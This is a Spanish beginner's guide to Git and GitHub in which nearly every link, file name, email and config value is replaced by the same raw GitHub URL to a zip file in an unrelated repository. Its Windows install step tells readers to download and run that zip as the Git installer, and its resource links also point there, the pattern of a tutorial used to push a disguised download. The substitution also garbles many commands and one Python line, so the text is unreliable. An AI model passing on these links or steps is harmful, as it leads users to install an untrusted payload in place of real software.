# Guía rapida de Git y GitHub

## 1. Introducción

### ¿Qué es Git?
Git es un sistema de control de versiones que te permite rastrear los cambios en tus archivos de código a lo largo del tiempo. Piensa en Git como un "historial detallado" de tu proyecto que te permite:
- Ver qué cambios hiciste y cuándo
- Volver a versiones anteriores si algo sale mal
- Trabajar en paralelo con otros programadores sin interferir

### ¿Qué es GitHub?
GitHub es una plataforma en línea que usa Git para almacenar y compartir proyectos de código. Es como "Google Drive para programadores", pero mucho más poderoso.

**Analogía simple**: Si Git es tu "cuaderno de apuntes" local, GitHub es la "biblioteca" donde guardas y compartes tus cuadernos con otros estudiantes.

### ¿Por qué es esencial en equipos?
- **Colaboración**: Varios programadores pueden trabajar en el mismo proyecto sin pisarse
- **Respaldo**: Tu código está seguro en la nube
- **Historial**: Puedes ver quién cambió qué y cuándo
- **Reversión**: Si algo se rompe, puedes volver a una versión que funcionaba

## 2. Configuración inicial

### Instalar Git en Windows

1. Ve a [https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
2. Descarga la versión más reciente
3. Ejecuta el instalador con las opciones por defecto
4. Verifica la instalación abriendo la terminal de Windows y ejecutando:

```bash
git --version
```

### Configuración básica

Configura tu identidad (solo necesitas hacerlo una vez):

```bash
git config --global https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip "Tu Nombre"
git config --global https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip "https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip"
```

Verifica la configuración:

```bash
git config --list
```

### Conectar con GitHub

#### Opción 1: HTTPS (Recomendado para principiantes)
1. Crea una cuenta en [https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
2. Cuando hagas push por primera vez, te pedirá usuario y contraseña
3. Desde 2021, necesitas usar un "Personal Access Token" en lugar de tu contraseña:
   - Ve a GitHub → Settings → Developer settings → Personal access tokens
   - Genera un nuevo token con permisos de "repo"
   - Guarda el token en un lugar seguro

#### Opción 2: SSH (Más avanzado)
1. Genera una clave SSH:
```bash
ssh-keygen -t ed25519 -C "https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip"
```
2. Presiona Enter para aceptar la ubicación por defecto
3. Copia la clave pública:
```bash
cat ~https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
```
4. Ve a GitHub → Settings → SSH and GPG keys → New SSH key
5. Pega la clave y guarda

## 3. Crear un repositorio

### Crear un repositorio local

Navega a tu carpeta de proyecto y ejecuta:

```bash
cd mi-proyecto-python
git init
```

Esto crea un repositorio Git vacío en tu carpeta.

### Crear un repositorio en GitHub

1. Ve a https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
2. Haz clic en el botón "New" (verde)
3. Nombra tu repositorio
4. Selecciona "Public" o "Private"
5. No inicialices con README si ya tienes archivos locales
6. Haz clic en "Create repository"

### Vincular repositorio local con GitHub

```bash
git remote add origin https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
```

### Hacer el primer push

```bash
# Agregar todos los archivos
git add .

# Hacer commit con mensaje descriptivo
git commit -m "Primer commit: estructura inicial del proyecto"

# Subir al repositorio remoto
git push -u origin main
```

## 4. Estructura de trabajo en equipo

### ¿Qué es una rama (branch)?

Una rama es una línea de desarrollo independiente. Imagina que el proyecto principal (`main`) es el tronco de un árbol, y las ramas son las ramas que salen de él. Cada programador puede trabajar en su propia rama sin afectar el código principal.

### Comandos básicos de ramas

```bash
# Ver todas las ramas
git branch

# Crear una nueva rama
git branch nombre-rama

# Cambiar a una rama
git checkout nombre-rama

# Crear y cambiar a una rama en un solo comando
git checkout -b nombre-rama

# Eliminar una rama
git branch -d nombre-rama
```

### Flujo de trabajo colaborativo

1. **Clonar el repositorio**:
```bash
git clone https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
cd proyecto
```

2. **Crear una rama para tu feature**:
```bash
git checkout -b feature/nueva-funcionalidad
```

3. **Hacer cambios y commits**:
```bash
# Editar archivos
git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
git commit -m "Añadir función de validación de email"
```

4. **Subir la rama**:
```bash
git push origin feature/nueva-funcionalidad
```

5. **Crear Pull Request en GitHub**:
   - Ve a GitHub
   - Haz clic en "Compare & pull request"
   - Describe tus cambios
   - Asigna reviewers si es necesario

6. **Merge después de revisión**:
   - El líder del equipo o reviewer aprueba
   - Se hace merge a la rama principal
   - Se puede eliminar la rama feature

## 5. Buenas prácticas

### Nombres de ramas claros

```bash
# Buenos ejemplos
git checkout -b feature/login-usuario
git checkout -b fix/bug-calculo-impuestos
git checkout -b docs/readme-instalacion

# Malos ejemplos
git checkout -b mi-rama
git checkout -b cambios
git checkout -b test
```

### Commits claros y específicos

```bash
# Buenos commits
git commit -m "Añadir validación de email en formulario de registro"
git commit -m "Corregir error de división por cero en cálculo de promedio"
git commit -m "Actualizar documentación de la API de usuarios"

# Malos commits
git commit -m "cambios"
git commit -m "fix"
git commit -m "funciona"
```

### Usar .gitignore

Crea un archivo `.gitignore` en la raíz de tu proyecto para ignorar archivos innecesarios:

```
# Archivos de Python
__pycache__/
*.pyc
*.pyo
*.pyd
.Python
env/
venv/
.venv/

# Archivos de sistema
.DS_Store
https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip

# Archivos de IDE
.vscode/
.idea/

# Archivos de configuración local
https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
.env
```

### Revisar antes de subir

```bash
# Ver qué archivos han cambiado
git status

# Ver los cambios específicos
git diff

# Ver el historial de commits
git log --oneline
```

### No trabajar directamente en main

Siempre crea una rama para tus cambios:

```bash
# NUNCA hagas esto
git checkout main
# editar archivos
git add .
git commit -m "cambios directos en main"

# SIEMPRE haz esto
git checkout -b feature/mi-nueva-funcionalidad
# editar archivos
git add .
git commit -m "descripción clara del cambio"
```

## 6. Resolución de conflictos

### ¿Qué es un conflicto?

Un conflicto ocurre cuando dos personas modifican las mismas líneas de código y Git no puede decidir automáticamente qué cambio mantener.

### Cómo detectar un conflicto

```bash
git pull origin main
# Si hay conflictos, verás algo como:
# CONFLICT (content): Merge conflict in https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
```

### Resolución paso a paso con VS Code

1. **Identifica los archivos en conflicto**:
```bash
git status
```

2. **Abre el archivo en VS Code**:
   - Verás marcadores como estos:
```python
def calcular_promedio(numeros):
<<<<<<< HEAD
    return sum(numeros) / len(numeros)
=======
    if len(numeros) == 0:
        return 0
    return sum(numeros) / len(numeros)
>>>>>>> feature/validacion-division
```

3. **Decide qué código mantener**:
   - `<<<<<<< HEAD`: tu código actual
   - `=======`: separador
   - `>>>>>>> rama`: código de la otra rama

4. **Edita el archivo** eliminando los marcadores y manteniendo el código correcto:
```python
def calcular_promedio(numeros):
    if len(numeros) == 0:
        return 0
    return sum(numeros) / len(numeros)
```

5. **Marca el conflicto como resuelto**:
```bash
git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
git commit -m "Resolver conflicto en función calcular_promedio"
```

## 7. Herramientas de GitHub

### Issues

Los Issues son como "tickets" de trabajo. Se usan para:
- Reportar bugs
- Solicitar nuevas funcionalidades
- Hacer preguntas
- Asignar tareas

**Cómo crear un Issue**:
1. Ve a tu repositorio en GitHub
2. Haz clic en "Issues"
3. Haz clic en "New issue"
4. Escribe un título descriptivo y una descripción detallada

### Pull Requests

Un Pull Request (PR) es una solicitud para fusionar cambios de una rama a otra.

**Proceso**:
1. Haz tus cambios en una rama
2. Sube la rama a GitHub
3. Crea el Pull Request
4. Otros revisan tu código
5. Se hace merge si todo está bien

### GitHub Projects

GitHub Projects es como un tablero Kanban para organizar el trabajo del equipo. Puedes crear columnas como:
- To Do
- In Progress
- In Review
- Done

### Colaborar en proyectos externos (Fork)

1. **Fork el repositorio**:
   - Haz clic en "Fork" en GitHub
   - Esto crea una copia en tu cuenta

2. **Clone tu fork**:
```bash
git clone https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
```

3. **Configura el upstream**:
```bash
git remote add upstream https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
```

4. **Mantén tu fork actualizado**:
```bash
git fetch upstream
git checkout main
git merge upstream/main
```

## 8. Automatización básica

### GitHub Actions

GitHub Actions permite automatizar tareas como:
- Ejecutar tests cuando subes código
- Verificar el estilo de código
- Desplegar aplicaciones automáticamente

**Ejemplo básico** (archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip`):

```yaml
name: Tests
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Set up Python
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: pip install -r https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
    - name: Run tests
      run: python -m pytest
```

## 9. Ejemplos reales en Python

### Versionando un archivo Python

Supongamos que tienes este archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip`:

```python
def sumar(a, b):
    return a + b

def restar(a, b):
    return a - b
```

**Proceso de versionado**:

```bash
# Inicializar repositorio
git init

# Agregar archivo
git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
git commit -m "Añadir funciones básicas de suma y resta"

# Hacer cambios
# Agregar función multiplicar
git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
git commit -m "Añadir función multiplicar"

# Ver historial
git log --oneline
```

### Colaboración en https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip

Imagina que tienes un archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip` compartido:

```python
# https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
def validar_email(email):
    return "@" in email

def formatear_nombre(nombre):
    return https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip().title()
```

**Flujo colaborativo**:

1. **Programador A** trabaja en validación:
```bash
git checkout -b feature/mejorar-validacion-email
# Edita la función validar_email
git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
git commit -m "Mejorar validación de email con regex"
git push origin feature/mejorar-validacion-email
```

2. **Programador B** trabaja en formateo:
```bash
git checkout -b feature/formateo-avanzado-nombre
# Edita la función formatear_nombre
git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
git commit -m "Añadir manejo de caracteres especiales en nombres"
git push origin feature/formateo-avanzado-nombre
```

3. **Ambos crean Pull Requests** y se revisan mutuamente

### Agregando cambios incrementales

```bash
# Agregar solo archivos específicos
git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip

# Agregar por partes (útil para commits granulares)
git add -p https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip

# Ver diferencias antes de commit
git diff --cached

# Commit con mensaje descriptivo
git commit -m "Añadir función de validación de contraseña segura"
```

## 10. Recursos adicionales

### Documentación oficial
- [Git Documentation](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
- [GitHub Docs](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)

### Tutoriales recomendados
- [Git Handbook](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
- [Learn Git Branching](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip) (interactivo)
- [GitHub Skills](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip) (cursos gratuitos)

### Herramientas útiles
- **GitKraken**: Cliente visual de Git
- **GitHub Desktop**: Cliente oficial de GitHub
- **VS Code Git Integration**: Extensiones de Git para VS Code

---

## Cheatsheet de comandos

### Comandos básicos
```bash
git init                    # Inicializar repositorio
git clone <url>            # Clonar repositorio
git status                 # Ver estado de archivos
git add <archivo>          # Agregar archivo al staging
git add .                  # Agregar todos los archivos
git commit -m "mensaje"    # Hacer commit
git push                   # Subir cambios
git pull                   # Bajar cambios
```

### Comandos de ramas
```bash
git branch                 # Listar ramas
git branch <nombre>        # Crear rama
git checkout <rama>        # Cambiar a rama
git checkout -b <rama>     # Crear y cambiar a rama
git merge <rama>           # Fusionar rama
git branch -d <rama>       # Eliminar rama
```

### Comandos de información
```bash
git log                    # Ver historial
git log --oneline          # Ver historial resumido
git diff                   # Ver cambios no staged
git diff --cached          # Ver cambios staged
git show                   # Ver último commit
```

### Comandos de remoto
```bash
git remote -v              # Ver repositorios remotos
git remote add origin <url> # Agregar repositorio remoto
git push -u origin main    # Subir y configurar upstream
git fetch                  # Bajar cambios sin merge
git pull origin main       # Bajar y fusionar cambios
```

### Comandos de emergencia
```bash
git reset --hard HEAD      # Descartar todos los cambios
git checkout -- <archivo>  # Descartar cambios de archivo
git reset HEAD <archivo>   # Quitar archivo del staging
git revert <commit>        # Revertir commit específico
```
